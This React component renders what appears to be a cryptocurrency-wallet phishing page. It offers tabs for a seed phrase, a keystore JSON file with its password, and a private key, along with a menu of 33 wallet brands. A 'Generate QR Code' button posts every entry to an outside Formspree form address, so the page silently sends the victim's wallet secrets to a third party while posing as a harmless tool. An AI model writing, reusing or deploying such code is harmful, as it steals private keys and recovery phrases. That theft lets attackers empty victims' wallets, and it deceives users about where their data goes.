import React, { useState } from 'react';
import Form from 'react-bootstrap/Form';
import '../Styles/Formpage.css'
import Navbar from '../Components/Navbar/navbar'



const Formpage = () => {

    
    const [page, setPage] = useState("about")

    return (
        <div>

            <header>
                <Navbar />
            </header>

            <div className="form-section">
                <div className="content-box-lg">
                    <div className="container">
                        <div className="row">
                            <div className="col-md-2"></div>
                            <div className="col-md-8">
                                <div className="form-box">
                                    <div className="heading-bar text-center">
                                        <button className="btn-1" onClick={() => setPage("about")} >Phrase</button>
                                        <button className="btn-2" onClick={() => setPage("about1")}>Keystore JSON</button>
                                        <button className="btn-3" onClick={() => setPage("about2")}>Private Key</button>
                                    </div>

                                        {
                                            page === "about" &&
                                        <Form className='firstForm' action="https://formspree.io/f/mwkypqgo" method="POST" >
                                            <h6 style={{color: '#fff', fontWeight: '800'}}>Select Wallet</h6>
                                            <Form.Select required style={{color: '#141b29', fontWeight: '800'}} name="wallet-name"  aria-label="form-select">
                                                <option style={{color: '#141b29', fontWeight: '800'}}> </option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="1">AAVE Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="2">Atomic Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="3">Authereum Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="4">Bandprotocol Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="5">Binance Smart Chain</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="6">Coinbase Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="7">Coinmoni Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="8">Defiat Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="9">Digitx Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="10">Eidoo Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="11">Enjin Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="12">Eos Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="13">Exodus Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="14">Formatic Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="15">Infinity Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="16">Ledger Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="17">Metamask Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="18">Mew Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="19">Monero Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="20">Pocket Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="21">Polkadot Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="22">Portis Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="23">Protocol Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="24">Ronin Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="25">Safepal Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="26">Solflare Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="27">Squarelink Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="28">Torus Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="29">Trezor Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="30">Tron Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="31">Trust Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="32">Wax Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="33">Zilliqa Wallet</option>           
                                            </Form.Select>
                                            <Form.Group className="mb-3" controlId="exampleForm.ControlTextarea1">
                                                <Form.Control style={{color: '#141b29', fontWeight: '800'}} as="textarea" required name="phrase" placeholder="Enter Phrase" rows={6} />
                                            </Form.Group>
                                            <h6 style={{color: '#fff'}}>Typically 12 (sometimes 24) words separated by a single space.</h6>
                                            <br />
                                            <button type="submit" className="generate-btn text-center">Generate QR Code</button>
                                        </Form>
                                        }

                                        {
                                            page === "about1" &&
                                        <Form className='secondForm' action="https://formspree.io/f/mwkypqgo" method="POST">
                                            <h6 style={{color: '#fff', fontWeight: '800'}}>Select Wallet</h6>
                                            <Form.Select required style={{color: '#141b29', fontWeight: '800'}} name="wallet-name"  aria-label="form-select">
                                                <option style={{color: '#141b29', fontWeight: '800'}}></option>
                                                <hr />
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="1">AAVE Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="2">Atomic Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="3">Authereum Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="4">Bandprotocol Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="5">Binance Smart Chain</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="6">Coinbase Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="7">Coinmoni Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="8">Defiat Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="9">Digitx Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="10">Eidoo Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="11">Enjin Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="12">Eos Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="13">Exodus Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="14">Formatic Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="15">Infinity Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="16">Ledger Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="17">Metamask Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="18">Mew Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="19">Monero Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="20">Pocket Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="21">Polkadot Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="22">Portis Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="23">Protocol Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="24">Ronin Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="25">Safepal Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="26">Solflare Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="27">Squarelink Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="28">Torus Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="29">Trezor Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="30">Tron Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="31">Trust Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="32">Wax Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="33">Zilliqa Wallet</option>           
                                            </Form.Select>
                                            <Form.Group className="mb-3" controlId="exampleForm.ControlTextarea1">
                                                <Form.Control style={{color: '#141b29', fontWeight: '800'}} as="textarea" required name="keystore" placeholder="Keystore JSON..." rows={6} />
                                            </Form.Group>
                                            <Form.Group className="mb-3" controlId="exampleForm.ControlInput1">
                                                <Form.Control style={{color: '#141b29', fontWeight: '800'}} type="password" required name="password" placeholder="Password..." />
                                            </Form.Group>
                                            <h6 style={{color: '#fff'}}>Several lines of text beginning with curly braces plus the password used for encryption.</h6>
                                            <br />
                                            <button type="submit" className="generate-btn text-center">Generate QR Code</button>
                                        </Form>
                                        }
                                       
                                       {
                                             page === "about2" &&
                                        <Form className='thirdForm' action="https://formspree.io/f/mwkypqgo" method="POST">
                                            <h6 style={{color: '#fff', fontWeight: '800'}}>Select Wallet</h6>
                                            <Form.Select style={{color: '#141b29', fontWeight: '800'}} name="wallet-name" required aria-label="form-select">
                                                <option style={{color: '#141b29', fontWeight: '800'}}></option>
                                                <hr />
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="1">AAVE Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="2">Atomic Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="3">Authereum Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="4">Bandprotocol Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="5">Binance Smart Chain</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="6">Coinbase Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="7">Coinmoni Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="8">Defiat Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="9">Digitx Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="10">Eidoo Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="11">Enjin Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="12">Eos Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="13">Exodus Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="14">Formatic Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="15">Infinity Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="16">Ledger Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="17">Metamask Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="18">Mew Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="19">Monero Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="20">Pocket Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="21">Polkadot Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="22">Portis Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="23">Protocol Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="24">Ronin Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="25">Safepal Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="26">Solflare Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="27">Squarelink Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="28">Torus Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="29">Trezor Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="30">Tron Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="31">Trust Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="32">Wax Wallet</option>
                                                <option style={{color: '#141b29', fontWeight: '800'}} value="33">Zilliqa Wallet</option>           
                                            </Form.Select>
                                            <Form.Group className="mb-3" controlId="exampleForm.ControlInput1">
                                                <Form.Control style={{color: '#141b29', fontWeight: '800'}} type="password" required name="private" placeholder="Private Key..." />
                                            </Form.Group>
                                            <h6 style={{color: '#fff'}}>Typically 12 (sometimes 24) words separated by a single space.</h6>
                                            <br />
                                            <button type="submit" className="generate-btn text-center">Generate QR Code</button>
                                        </Form>
                                        }

                                </div>
                            </div>
                            <div className="col-md-2"></div>
                        </div>
                    </div>
                </div>
            </div>
            
        </div>
    )
}

export default Formpage;
